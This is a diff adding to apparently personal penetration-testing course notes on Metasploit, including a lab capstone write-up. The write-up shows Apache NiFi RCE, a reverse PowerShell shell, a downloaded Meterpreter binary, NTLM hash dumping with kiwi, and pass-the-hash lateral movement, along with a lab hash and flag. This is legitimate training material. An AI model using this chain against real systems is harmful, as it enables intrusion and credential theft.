@@ -356,6 +356,12 @@ run -j   # run as background job, terminal stays free
 
 > 📸 Screenshot: `msfvenom` generating met.exe; `multi/handler` listener output; staged session opening with "Sending stage (336 bytes)"
 
+> 🔁 Similar to: [[Common Web Application Attacks#File Upload]] — the PHP webshell chain in 21.2.3 VM#2 is the same technique covered in that module: upload bypass (.pHP extension) + form field discovery via gobuster + curl trigger.
+
+External resources:
+- [PayloadsAllTheThings — MSF Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet.md)
+- [HackTricks — MSF/msfvenom payload generation](https://github.com/HackTricks-wiki/hacktricks/blob/master/generic-methodologies-and-resources/reverse-shells/msfvenom.md)
+
 **Labs:**
 
 Q1: Command to list all payloads of msfvenom?
@@ -448,6 +454,8 @@ kiwi_cmd <cmd>     # raw Mimikatz command passthrough
 ```
 
 > 🔍 Worth remembering generally: `load kiwi` + `creds_msv` is the quickest path to NTLM hashes when you have SYSTEM. Saves the whole reg.exe save + smbserver + secretsdump pipeline.
+
+External resource: [HackTricks — Mimikatz / Kiwi inside Meterpreter](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/stealing-credentials/credentials-mimikatz.md)
 
 **Enumerating the Hosts file:**
 ```bash
@@ -612,7 +620,38 @@ Q2: What is the number of the first port scanned by portscan.rc?
 
 > 🚩 Hands-on, VM spin-up required: 21.4.1 VM#1 — use `listener.rc` resource script to set up multi/handler, get Meterpreter session from VM#1 ⬜ Pending
 
-> 🚩 Hands-on, VM spin-up required: 21.4.1 Capstone VM Group 1 — enumerate both VMs using techniques from this module, gain access to both, find the flag ⬜ Pending
+✅ **21.4.1 Capstone VM Group 1** — Flag: `OS{05cf9f9964751cf5fd9d380efc330fb7}`
+
+> 🔧 Technique: **Apache NiFi unauthenticated RCE.** NiFi is a Java-based data flow tool common in enterprise data pipelines. Older versions (pre-1.14 without auth enforced) expose a REST API that lets anyone create an `ExecuteProcess` processor — essentially a scheduled task that runs an arbitrary OS command. No auth, no CVE, just a feature abused. MSF module: `exploit/multi/http/apache_nifi_processor_rce`. Always `set SSL false` when connecting to a plain HTTP NiFi instance — the module defaults to SSL and fails with a TLS handshake error.
+
+> 🔍 Worth remembering generally: When an MSF module fails with `SSL_connect wrong version number`, it's trying HTTPS against a plain HTTP service. `set SSL false` (with no `!` at the prompt — just set it) and re-run.
+
+> 🔍 Worth remembering generally: **Credential reuse via hash naming convention.** `creds_msv` on VM#1 returned a local account called `itwk04admin`. The hostname in the name (`itwk04`) is the exact hostname of VM#2. This is a common pattern: admins create named service accounts on each machine with a matching password. Dump hashes, look for usernames that reference other hostnames, try PtH against those machines. No network-level pivoting needed when both hosts are on the same reachable subnet.
+
+**Capstone network topology:**
+
+```mermaid
+flowchart LR
+    K["Kali\n192.168.45.173"] -->|"NiFi RCE\nport 8080"| V1["ITWK03\n192.168.249.225"]
+    V1 -->|"creds_msv dumps\nitwk04admin hash"| H["NTLM hash\nitwk04admin"]
+    H -->|"PtH psexec"| V2["ITWK04\n192.168.249.226"]
+    K -->|"psexec direct\n(same /24)"| V2
+```
+
+**VM#1 (192.168.249.225 — ITWK03):**
+- nmap found Apache NiFi 1.17.0 on port 8080 (Windows, no auth)
+- Used `exploit/multi/http/apache_nifi_processor_rce` with `cmd/windows/powershell_reverse_tcp` (SSL false, DELAY 20) to get a PowerShell session as `alex`
+- Downloaded `met.exe` via `iwr`, caught with `multi/handler` — Meterpreter session as `alex`
+- `getsystem` via Named Pipe Impersonation (PrintSpooler) → SYSTEM
+- `load kiwi` + `creds_msv` dumped three hashes including `itwk04admin` (NTLM: `445414c16b5689513d4ad8234391aacf`)
+
+**VM#2 (192.168.249.226 — ITWK04):**
+- Both VMs on same /24 — no network-level pivot needed, credential-based lateral movement
+- `exploit/windows/smb/psexec` with `itwk04admin` hash (PtH) → Meterpreter session 3 as SYSTEM
+- `type C:\Users\itwk04admin\Desktop\flag.txt` → `OS{05cf9f9964751cf5fd9d380efc330fb7}`
+
+> 📸 Screenshot: creds_msv output showing itwk04admin hash
+> 📸 Screenshot: flag.txt on ITWK04 Desktop
 
 ---
 
@@ -694,9 +733,17 @@ msfvenom -p PAYLOAD LHOST=IP LPORT=PORT -f FORMAT -o FILE
 
 ## Video Walkthroughs
 
-> 📹 Search [ippsec.rocks](https://ippsec.rocks) for: `metasploit` `meterpreter` `msfvenom` `autoroute`
-> Boxes to watch: Lame (intro MSF exploit modules), Legacy (ms08_067 + Meterpreter), Blue (EternalBlue MSF path), Devel (msfvenom ASPX + multi/handler)
+Search [ippsec.rocks](https://ippsec.rocks) for: `metasploit` `meterpreter` `msfvenom` `autoroute` `kiwi` `nifi`
+
+| Box | Why watch it | ippsec search term |
+|---|---|---|
+| HTB **Lame** | First MSF exploit module (vsftpd + usermap_script), basic session workflow | `lame metasploit` |
+| HTB **Legacy** | `ms08_067_netapi` exploit, Windows XP Meterpreter, classic post-exploitation | `legacy metasploit` |
+| HTB **Blue** | EternalBlue via MSF, `hashdump`, Meterpreter post-exploitation workflow | `blue eternalblue` |
+| HTB **Devel** | msfvenom ASPX payload, multi/handler, IIS file upload foothold | `devel msfvenom` |
+| HTB **Jerry** | Tomcat WAR file delivery, msfvenom `-f war` | `jerry tomcat` |
+| HTB **Grandpa** | Token impersonation → getsystem, old but shows the full path clearly | `grandpa getsystem` |
 
 ---
 
-#### Tags: #Module21 #Metasploit #MSF #Meterpreter #msfvenom #AuxiliaryModules #ExploitModules #PostExploitation #StagedPayloads #Kiwi #Pivoting #ResourceScripts #ExploitFrameworks
+#### Tags: #Module21 #Metasploit #MSF #Meterpreter #msfvenom #AuxiliaryModules #ExploitModules #PostExploitation #StagedPayloads #Kiwi #Pivoting #ResourceScripts #ExploitFrameworks #ApacheNiFi #PtH #LateralMovement #CredentialReuse
